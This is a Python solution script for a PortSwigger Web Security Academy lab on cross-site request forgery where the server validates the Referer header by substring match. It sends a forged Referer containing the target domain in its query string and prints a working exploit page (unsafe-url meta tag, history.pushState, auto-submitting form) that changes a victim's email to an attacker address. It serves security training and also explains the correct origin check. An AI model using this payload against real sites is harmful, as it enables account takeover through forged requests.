# Lab 12 — CSRF with broken Referer validation
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
#
# Vulnerability: Server checks if the target domain appears ANYWHERE in Referer
#                (substring match instead of exact origin match)
# Aim:           Forge a Referer that contains the target domain as a substring
#
# Technique:
#   The server does something like:
#     if (TARGET_DOMAIN in referer_header): accept
#   So: https://evil.com/?TARGET_DOMAIN passes the check
#   because TARGET_DOMAIN appears in the query string.
#
#   history.pushState() changes the browser's URL without navigating,
#   which changes what gets sent as the Referer on the next request.
#   <meta name="referrer" content="unsafe-url"> ensures the full URL
#   (including query string) is sent in the Referer header.
#
#   This script:
#     1. Confirms correct Referer is accepted
#     2. Confirms wrong Referer is rejected
#     3. Confirms the domain-in-querystring trick works
#     4. Prints the exploit with history.pushState and unsafe-url meta tag
#
#   📝 Substring matching for security is almost always wrong. The safe check
#      is: does the ORIGIN of the Referer exactly match the expected origin?
#      new URL(referer).origin === expectedOrigin  — not .includes()
#
# Usage: python csrf_lab12.py <url>

import sys
import urllib.parse
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        check_email_changed, print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 12 — CSRF: BROKEN REFERER VALIDATION (SUBSTRING BYPASS)")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab12.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    target_host = urllib.parse.urlparse(url).netloc  # e.g. TARGET.web-security-academy.net

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    # ── Step 1: correct Referer → accepted ───────────────────────────────────
    print("\n  ── Step 1: correct Referer → should be accepted\n")
    r_good = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL},
        headers={"Referer": url + "/my-account"},
        allow_redirects=True
    )
    if r_good.status_code == 200:
        print("  ✔  Correct Referer → accepted")

    # ── Step 2: wrong Referer → rejected ─────────────────────────────────────
    print("\n  ── Step 2: wrong Referer → should be rejected\n")
    r_bad = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL},
        headers={"Referer": "https://evil.com/"},
        allow_redirects=True
    )
    if r_bad.status_code == 400 or "Referer" in r_bad.text:
        print("  ✔  Wrong Referer → rejected")

    # ── Step 3: target domain in querystring → should be accepted ─────────────
    print(f"\n  ── Step 3: Referer with {target_host} in query string → should bypass\n")
    forged_referer = f"https://evil.com/?{target_host}"
    r_bypass = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL},
        headers={"Referer": forged_referer},
        allow_redirects=True
    )
    check_email_changed(r_bypass.text, TEST_EMAIL)

    # ── Step 4: print exploit ─────────────────────────────────────────────────
    section("Step 4: Exploit HTML for the exploit server")

    exploit = f"""\
<!-- unsafe-url ensures full URL including query string is sent as Referer -->
<meta name="referrer" content="unsafe-url">

<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
</form>
<script>
    // Change the page URL so the Referer contains the target domain in its query string
    // The exploit server URL becomes: https://exploit-server.net/?{target_host}
    history.pushState('', '', '/?{target_host}');
    document.forms[0].submit();
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print(f"  ℹ  history.pushState changes the exploit server URL to:")
    print(f"     https://YOUR-EXPLOIT-SERVER.net/?{target_host}")
    print(f"     Referer sent: https://YOUR-EXPLOIT-SERVER.net/?{target_host}")
    print(f"     Server checks: '{target_host}' in Referer → True → accepted")
    print(f"     But the actual origin is evil.com, not {target_host}.")
